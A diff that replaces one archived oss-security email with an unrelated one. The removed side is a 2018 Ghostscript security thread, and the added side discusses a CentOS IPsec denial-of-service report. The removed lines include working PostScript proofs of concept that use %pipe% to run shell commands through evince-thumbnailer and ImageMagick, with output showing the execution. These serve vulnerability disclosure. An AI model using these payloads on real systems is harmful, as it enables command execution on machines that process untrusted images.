@@ -1,147 +1,46 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/23/1
-Message-ID: <CAJ_zFkJ-qq_SRuiif-mUZmURpTgHrmwx0cp_gM3ms_-TwNVODQ@mail.gmail.com>
-Date: Wed, 22 Aug 2018 17:35:11 -0700
-From: Tavis Ormandy <taviso@...gle.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/08/2
+Message-ID: <7715302c.4982.166518c08aa.Coremail.a4651386@163.com>
+Date: Mon, 8 Oct 2018 10:40:23 +0800 (CST)
+From: luo  <a4651386@....com>
+To: "Solar Designer" <solar@...nwall.com>
+Cc: oss-security@...ts.openwall.com
+Subject: Re: CVE-2018-17977: CentOS ipsec remote denial of service vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Thanks Amit, that's scary, it looks like they're working on it right now.
+All security servers and clients need to have the IPSec function enabled, which is what ah_add does, that is to say, all IPSec servers or clients, if you use the desktop version of centos, there will be such a remote denial of service problem.
 
-FWIW, I figured out how to reproduce the original bug here in
-evince-thumbnailer:
 
-$ cat test.jpeg
-%!PS
-a0
-{ null restore } stopped { pop } if
-(ppmraw) selectdevice
-legal
-mark /OutputFile (%pipe%id) currentdevice putdeviceprops
-showpage
-$ strace -q -feexecve evince-thumbnailer  test.jpeg foo.out
-execve("/usr/bin/evince-thumbnailer", ["evince-thumbnailer", "test.jpeg",
-"foo.out"], 0x7ffeed3010d0 /* 65 vars */) = 0
-execve("/bin/sh", ["sh", "-c", "id"], 0x7ffcf3ea8d18 /* 65 vars */) = 0
+Oh, sorry, maybe I didn't explain it.
 
-Tavis.
+This is the same as what ah_add does. The only difference is that ah_add makes the encryption length 0. This makes it easier for me to write POC. In reality, the longer the encryption length, the more the denial of service will be.In other words, under the real production environment, the ipsec denial service effect will be more obvious.
 
-On Wed, Aug 22, 2018 at 12:30 PM AmitB <me@...tbl.com> wrote:
 
-> I also took a look a copule weeks ago at few of the patches for your
-> previous bugs from 2 years ago, and found that one of them is incomplete
-> and still allowing RCE (
-> https://bugs.ghostscript.com/show_bug.cgi?id=697178)
->
-> POC:
-> ------------------
-> $ cat poc.jpg
-> %!PS
-> << (ICCProfilesDir) (%pipe%id > /dev/) >> .setuserparams
-> currentdevice null true mark /OutputICCProfile (tty)
-> .putdeviceparams
-> showpage
-> $ identify poc.jpg
-> uid=1000(amit) gid=1000(amit) groups=1000(amit)
->
-> After reviewing all of the comments in the original bug report I saw that
-> you actually mentioned this issue, but it was not taken under
-> consideration/forgotten for some reason.
-> So effectively a public RCE PoC has been avaliable for GhostScript for
-> almost 2 years.
->
-> I opened a report two weeks ago at bugs.ghostscript.com:
-> 699623 Incomplete fix for #697178 Allowing -dSAFER bypass
->
-> But I got no response from them until today.
-> If you have others channels of contact with them please let them know about
-> this one too.
->
-> On Tue, Aug 21, 2018 at 11:12 PM, Tavis Ormandy <taviso@...gle.com> wrote:
->
-> > Thanks Alex.
-> >
-> > FWIW, not all of these are visible, but I've started filing bugs, I'll
-> file
-> > a few more today and then let the developers work through the most
-> serious
-> > ones.
-> >
-> > 699654 /invalidaccess checks stop working after a failed restore
-> > 699655 missing type checking in setcolor
-> > 699656 LockDistillerParams boolean missing type checks
-> > 699659 missing type check in type checker (!)
-> > 699657 .tempfile SAFER restrictions seem to be broken
-> > 699658 Bypassing PermitFileReading by handling undefinedfilename error
-> > 699660 shading_param incomplete type checking
-> > 699661 pdf14 garbage collection memory corruption
-> > 699662 calling .bindnow causes sideeffects
-> > 699663 .setdistillerkeys memory corruption
-> > 699664 corrupt device object after error in job
-> >
-> > I'm working on getting reproducers working for the developers for all
-> bugs.
-> >
-> > On Tue, Aug 21, 2018 at 8:22 AM Alex Gaynor <alex.gaynor@...il.com>
-> wrote:
-> >
-> > > A small note. Both ImageMagick and GraphicsMagick process various file
-> > > formats that can nest a different image file inside of them. These are
-> > very
-> > > frequently implemented with a call to ReadImage(), with no checking
-> that
-> > > it's the expected file format. (As a result, the fuzzer finds various
-> > > impressive chains, with sometimes 3 different image formats nested
-> inside
-> > > of each other).
-> > >
-> > > The conclusion of this is that people _must not_ attempt to do their
-> own
-> > > format detection and then pass the data to IM/GM, because this can be
-> > > bypassed with nested formats. It's imperative that GS truly be disabled
-> > > with either policy.xml or by uninstall GS.
-> > >
-> > > Alex
-> > >
-> > > On Tue, Aug 21, 2018 at 11:01 AM Bob Friesenhahn <
-> > > bfriesen@...ple.dallas.tx.us> wrote:
-> > >
-> > > > On Tue, 21 Aug 2018, Tavis Ormandy wrote:
-> > > > >
-> > > > > I think those thumbnails should be disabled, but you've probably
-> > > noticed
-> > > > I
-> > > > > think everything related to untrusted ghostscript should be
-> disabled
-> > > :-)
-> > > >
-> > > > I have posted to the GraphicsMagick Announcements mailing list
-> > > > regarding your findings (with a link to this list) and suggested that
-> > > > a fool-proof solution is that Ghostscript should be uninstalled.
-> > > >
-> > > > Uninstalling Ghostscript entirely might cause software using libgs to
-> > > > not execute at all unless a stub library is put in its place.
-> > > >
-> > > > Dependencies on Ghostscript are much larger than one would initially
-> > > > think due to Postscript being the traditional output from Unix
-> > > > software for "printing" and thus it is used as an intermediate format
-> > > > in order to convert between formats.  EPS content is also embedded in
-> > > > some other formats.
-> > > >
-> > > > Bob
-> > > > --
-> > > > Bob Friesenhahn
-> > > > bfriesen@...ple.dallas.tx.us,
-> > > http://www.simplesystems.org/users/bfriesen/
-> > > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
-> > > >
-> > >
-> > >
-> > > --
-> > > All that is necessary for evil to succeed is for good people to do
-> > nothing.
-> > >
-> >
->
 
+
+
+
+
+
+At 2018-10-06 00:54:06, "Solar Designer" <solar@...nwall.com> wrote:
+>On Fri, Oct 05, 2018 at 11:46:07PM +0800, luo wrote:
+>> I don't know if it is correct to publish the complete information.
+>
+>It is.  Linking to temporary resources like Google Drive isn't great,
+>but luckily your message itself includes some detail.
+>
+>> > The Linux kernel 4.14.67 mishandles certain interaction among XFRM
+>> > Netlink messages, IPPROTO_AH packets, and IPPROTO_IP packets, which
+>> > allows local users to cause a denial of service (memory consumption
+>> > and system hang) by leveraging root access to execute crafted
+>> > applications, as demonstrated on CentOS 7.
+>
+>Since you say that "leveraging root access to execute crafted
+>applications" is required, how is this a security issue?  Also, since
+>this setup has to be prepared locally, how is the attack "remote"?
+>
+>In other words, would a sysadmin plausibly make this kind of custom
+>local setup, and why?  If the answer is no, then I think there's no
+>security issue here.
+>
+>Alexander
